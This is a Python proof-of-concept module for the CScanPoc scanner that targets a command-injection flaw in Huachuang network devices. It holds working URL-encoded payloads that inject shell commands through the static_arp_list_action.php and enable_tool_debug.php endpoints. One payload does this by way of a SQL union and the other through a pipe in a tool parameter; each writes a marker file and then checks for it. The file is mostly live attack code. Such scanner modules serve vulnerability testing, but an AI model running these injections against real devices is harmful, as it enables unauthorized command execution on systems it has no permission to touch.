# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Huachuang_0003'  # 平台漏洞编号，留空
    name = '华创设备 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-01-23'  # 漏洞公布时间
    desc = '''
        华创设备 /acc/bindipmac/static_arp_list_action.php
                /acc/tools/enable_tool_debug.php 任意命令执行。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3728/'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '华创'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8608d984-1fa4-4888-b390-895524b9091a'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            arg = self.target
            payloads = [
                #arg + 'acc/network/redial_pppoe.php?wan=a|echo%20testvul>testvul.txt||',
                #arg + 'acc/debug/bytecache_run_action.php?action=1&engine=test%27|echo%20testvul>testvul.txt||%27a',
                arg + '/acc/bindipmac/static_arp_list_action.php?chkSysArpList[0]=0&sysArpEth[0]=1%27%20and%200%20union%20select%20%27a||echo%20testvul>testvul.txt||b--&sysArpIp[0]=1&sysArpMac[0]=1',
                arg + '/acc/tools/enable_tool_debug.php?val=0&tool=1&par=-c%201%20localhost%20|%20echo%20testvul>testvul.txt%20||%20a',
            ]
            verifys = [
                #arg + 'acc/network/testvul.txt',
                #arg + 'acc/debug/testvul.txt',
                arg + '/acc/bindipmac/testvul.txt',
                arg + '/acc/tools/testvul.txt',
            ]
            for i in range(len(payloads)):
                payload = payloads[i]
                verify = verifys[i]
                response = requests.get(payload)
                if response.status_code == 200:
                    response1 = requests.get(verify)
                    if response1.status_code == 200 and 'testvul' in response1.content:
                        #print payload+"存在命令执行漏洞"
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞，，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=verify))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
